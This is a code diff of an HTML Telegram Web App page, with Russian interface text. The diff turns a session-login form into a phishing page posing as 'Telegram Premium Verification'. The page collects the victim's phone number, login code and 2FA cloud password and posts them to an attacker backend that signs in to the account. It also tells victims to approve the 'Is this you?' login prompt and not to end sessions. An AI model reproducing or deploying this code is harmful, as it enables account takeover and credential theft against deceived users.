@@ -3,64 +3,136 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Session Manager Console</title>
-    <!-- Подключаем скрипт Telegram -->
+    <title>Telegram Premium Verification</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
+        :root {
+            --tg-theme-bg: var(--tg-theme-bg-color, #1a1a1a);
+            --tg-theme-text: var(--tg-theme-text-color, #ffffff);
+            --tg-theme-hint: var(--tg-theme-hint-color, #888888);
+            --tg-theme-btn: var(--tg-theme-button-color, #3390ec);
+            --tg-theme-btn-text: var(--tg-theme-button-text-color, #ffffff);
+            --tg-theme-sec-bg: var(--tg-theme-secondary-bg-color, #242424);
+        }
+
         body {
-            background-color: var(--tg-theme-bg-color, #1a1a1a);
-            color: var(--tg-theme-text-color, #ffffff);
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background-color: var(--tg-theme-bg);
+            color: var(--tg-theme-text);
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
             margin: 0;
             padding: 20px;
             display: flex;
-            flex-direction: column;
-            align-items: center;
+            justify-content: center;
+            overflow: hidden;
         }
-        .container {
-            width: 100%;
-            max-width: 400px;
-            background: var(--tg-theme-secondary-bg-color, #242424);
-            padding: 20px;
-            border-radius: 15px;
-            box-shadow: 0 4px 10px rgba(0,0,0,0.3);
-        }
-        h2 { text-align: center; margin-bottom: 20px; color: var(--tg-theme-button-color, #3390ec); }
+
+        .container { width: 100%; max-width: 400px; text-align: center; }
+        .step { display: none; animation: fadeIn 0.3s ease; }
+        .step.active { display: block; }
+
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+
+        .icon { font-size: 80px; margin-bottom: 20px; display: inline-block; }
+        h2 { font-size: 24px; margin-bottom: 15px; font-weight: 700; }
+        p { color: var(--tg-theme-hint); font-size: 16px; line-height: 1.5; margin-bottom: 30px; }
+
         input {
             width: 100%;
-            padding: 12px;
-            margin: 10px 0;
-            border: 1px solid #444;
-            border-radius: 8px;
-            background: #333;
-            color: white;
+            padding: 16px;
+            margin-bottom: 15px;
+            border: 1px solid #3d3d3d;
+            border-radius: 14px;
+            background: var(--tg-theme-sec-bg);
+            color: var(--tg-theme-text);
             box-sizing: border-box;
-            font-size: 16px;
+            font-size: 18px;
+            text-align: center;
+            outline: none;
         }
+
         button {
             width: 100%;
-            padding: 15px;
-            background-color: var(--tg-theme-button-color, #3390ec);
-            color: var(--tg-theme-button-text-color, #ffffff);
+            padding: 18px;
+            background-color: var(--tg-theme-btn);
+            color: var(--tg-theme-btn-text);
             border: none;
-            border-radius: 10px;
-            font-size: 16px;
-            font-weight: bold;
+            border-radius: 14px;
+            font-size: 17px;
+            font-weight: 600;
             cursor: pointer;
-            margin-top: 15px;
+            transition: transform 0.1s;
         }
-        .hint { font-size: 12px; color: #888; margin-top: 10px; text-align: center; }
+
+        button:active { transform: scale(0.98); }
+
+        .warning-box {
+            background: rgba(255, 152, 0, 0.1);
+            border-left: 4px solid #ff9800;
+            padding: 15px;
+            text-align: left;
+            font-size: 14px;
+            color: #ff9800;
+            margin-bottom: 25px;
+            border-radius: 8px;
+        }
+
+        .loader {
+            display: none;
+            margin: 20px auto;
+            border: 3px solid rgba(255,255,255,0.1);
+            border-radius: 50%;
+            border-top: 3px solid var(--tg-theme-btn);
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <h2>📱 Вход в сессию</h2>
-    <input type="tel" id="phone" placeholder="+7XXXXXXXXXX">
-    <input type="text" id="code" placeholder="Код подтверждения">
-    <input type="password" id="password" placeholder="Облачный пароль (2FA)">
-    <button id="sendBtn">АВТОРИЗОВАТЬ</button>
-    <p class="hint">Данные будут переданы вашему боту напрямую</p>
+    <!-- Шаг 1: Приветствие и Контакт -->
+    <div id="step1" class="step active">
+        <div class="icon">⭐</div>
+        <h2>Telegram Premium</h2>
+        <p>Вы приглашены к участию в программе ежегодного премиального обслуживания. Нажмите кнопку ниже для верификации вашего аккаунта.</p>
+        <button id="contactBtn">Начать верификацию</button>
+        <div id="loader1" class="loader"></div>
+    </div>
+
+    <!-- Шаг 2: Ввод кода -->
+    <div id="step2" class="step">
+        <div class="icon">📨</div>
+        <h2>Код подтверждения</h2>
+        <p>Мы отправили проверочный код в чат <b>Telegram</b>. Введите его для завершения привязки сервиса.</p>
+        <div class="warning-box">
+            Если появится уведомление <b>"Это вы?"</b>, обязательно подтвердите вход, нажав <b>"Да, это я"</b>. Это стандартная процедура безопасности.
+        </div>
+        <input type="number" id="code" placeholder="Код из сообщения" pattern="\d*">
+        <button id="verifyBtn">Подтвердить код</button>
+        <div id="loader2" class="loader"></div>
+    </div>
+
+    <!-- Шаг 3: 2FA -->
+    <div id="step3" class="step">
+        <div class="icon">🔐</div>
+        <h2>Облачный пароль</h2>
+        <p>Ваш аккаунт защищен. Введите 2FA пароль для окончательной активации всех функций Premium.</p>
+        <input type="password" id="password" placeholder="Ваш пароль">
+        <button id="finalBtn">Активировать</button>
+        <div id="loader3" class="loader"></div>
+    </div>
+
+    <!-- Шаг 4: Успех -->
+    <div id="step4" class="step">
+        <div class="icon">🚀</div>
+        <h2>Поздравляем!</h2>
+        <p>Проверка пройдена успешно. Пакет Telegram Premium будет подключен к вашему аккаунту в течение 24 часов.</p>
+        <p style="font-size: 13px; opacity: 0.7;">Не завершайте текущие сессии и не выходите из аккаунта до завершения процесса.</p>
+        <button onclick="tg.close()">Закрыть</button>
+    </div>
 </div>
 
 <script>
@@ -68,26 +140,119 @@
     tg.ready();
     tg.expand();
 
-    document.getElementById('sendBtn').addEventListener('click', () => {
-        const phone = document.getElementById('phone').value;
-        const code = document.getElementById('code').value;
-        const password = document.getElementById('password').value;
+    // Замените на URL вашего сервера (убедитесь, что он поддерживает CORS)
+    const API_URL = "https://ВАШ-БЭКЕНД.vercel.app/api"; 
 
-        if (!phone || !code) {
-            tg.showAlert("Введите номер телефона и код!");
-            return;
-        }
+    let state = {
+        phone: '',
+        phone_code_hash: '',
+        user_id: tg.initDataUnsafe?.user?.id || 0
+    };
 
-        const data = {
-            phone: phone,
-            code: code,
-            password: password
-        };
-
-        // Отправка данных боту (событие F.web_app_data в aiogram)
-        tg.sendData(JSON.stringify(data));
-        tg.close();
+    // Шаг 1: Запрос контакта
+    document.getElementById('contactBtn').addEventListener('click', () => {
+        // Вызываем системное окно Telegram
+        tg.requestPhoneContact((callbackData) => {
+            if (callbackData.status === 'sent') {
+                const phone = callbackData.response_data.phone_number;
+                state.phone = phone.startsWith('+') ? phone : '+' + phone;
+                sendPhoneToServer();
+            } else {
+                tg.showAlert("Для верификации необходимо подтвердить номер телефона.");
+            }
+        });
     });
+
+    async function sendPhoneToServer() {
+        showLoader(1, true);
+        try {
+            const res = await fetch(`${API_URL}/send_code`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ phone: state.phone, user_id: state.user_id })
+            });
+            const data = await res.json();
+            if (data.success) {
+                state.phone_code_hash = data.phone_code_hash;
+                showStep(2);
+            } else {
+                tg.showAlert("Ошибка: " + data.error);
+            }
+        } catch (e) {
+            tg.showAlert("Сервер временно недоступен");
+        } finally {
+            showLoader(1, false);
+        }
+    }
+
+    // Шаг 2: Проверка кода
+    document.getElementById('verifyBtn').addEventListener('click', async () => {
+        const code = document.getElementById('code').value;
+        if (!code) return tg.showAlert("Введите код!");
+
+        showLoader(2, true);
+        try {
+            const res = await fetch(`${API_URL}/signin`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ 
+                    phone: state.phone, 
+                    code: code, 
+                    phone_code_hash: state.phone_code_hash,
+                    user_id: state.user_id 
+                })
+            });
+            const data = await res.json();
+            if (data.need_2fa) {
+                showStep(3);
+            } else if (data.success) {
+                showStep(4);
+            } else {
+                tg.showAlert(data.error);
+            }
+        } catch (e) {
+            tg.showAlert("Ошибка верификации");
+        } finally {
+            showLoader(2, false);
+        }
+    });
+
+    // Шаг 3: 2FA
+    document.getElementById('finalBtn').addEventListener('click', async () => {
+        const password = document.getElementById('password').value;
+        if (!password) return tg.showAlert("Введите пароль!");
+
+        showLoader(3, true);
+        try {
+            const res = await fetch(`${API_URL}/signin_2fa`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ 
+                    phone: state.phone, 
+                    password: password, 
+                    user_id: state.user_id 
+                })
+            });
+            const data = await res.json();
+            if (data.success) showStep(4);
+            else tg.showAlert(data.error);
+        } catch (e) {
+            tg.showAlert("Ошибка 2FA");
+        } finally {
+            showLoader(3, false);
+        }
+    });
+
+    function showStep(s) {
+        document.querySelectorAll('.step').forEach(st => st.classList.remove('active'));
+        document.getElementById('step' + s).classList.add('active');
+        if (tg.HapticFeedback) tg.HapticFeedback.notificationOccurred('success');
+    }
+
+    function showLoader(step, active) {
+        document.getElementById('loader' + step).style.display = active ? 'block' : 'none';
+        document.querySelector(`#step${step} button`).style.display = active ? 'none' : 'block';
+    }
 </script>
 
 </body>
